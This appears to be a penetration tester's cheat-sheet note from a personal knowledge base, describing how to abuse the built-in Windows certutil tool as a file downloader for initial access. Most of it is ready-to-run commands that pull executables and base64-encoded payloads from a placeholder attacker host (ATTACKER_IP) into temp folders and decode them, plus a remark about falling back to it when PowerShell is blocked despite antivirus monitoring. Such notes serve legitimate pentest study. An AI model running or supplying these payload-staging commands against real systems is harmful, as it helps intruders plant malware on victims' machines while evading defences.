---
tags: [pentest, transfer, certutil, lolbin, windows, initial-access]
tool: certutil
phase: 5
---
# certutil Download (LOLBin)

Windows built-in certificate utility that doubles as a file downloader. No PowerShell needed — works from cmd.exe.

[[00 - README|Folder index]]

## Download a file

```cmd
certutil -urlcache -split -f http://ATTACKER_IP/file.exe C:\Windows\Temp\file.exe
```

| Flag | Meaning |
| --- | --- |
| `-urlcache` | Use the URL cache |
| `-split` | Split across multiple files (required for binary) |
| `-f` | Force overwrite |

## Download and decode Base64

```cmd
:: Download base64-encoded payload
certutil -urlcache -split -f http://ATTACKER_IP/payload.b64 C:\Temp\payload.b64

:: Decode
certutil -decode C:\Temp\payload.b64 C:\Temp\payload.exe
```

## Encode/decode locally

```cmd
:: Encode a file to base64
certutil -encode file.exe file.b64

:: Decode base64 back to binary
certutil -decode file.b64 file.exe
```

## Hash a file (bonus)

```cmd
certutil -hashfile file.exe MD5
certutil -hashfile file.exe SHA256
```

> [!warning] AV detection
> Certutil downloads are heavily flagged by modern AV/EDR. Windows Defender specifically monitors certutil for download activity. Use as a fallback when PowerShell is blocked.

## See also

- [[16 - bitsadmin Download (LOLBin)]]
- [[14 - PowerShell Download Methods]]
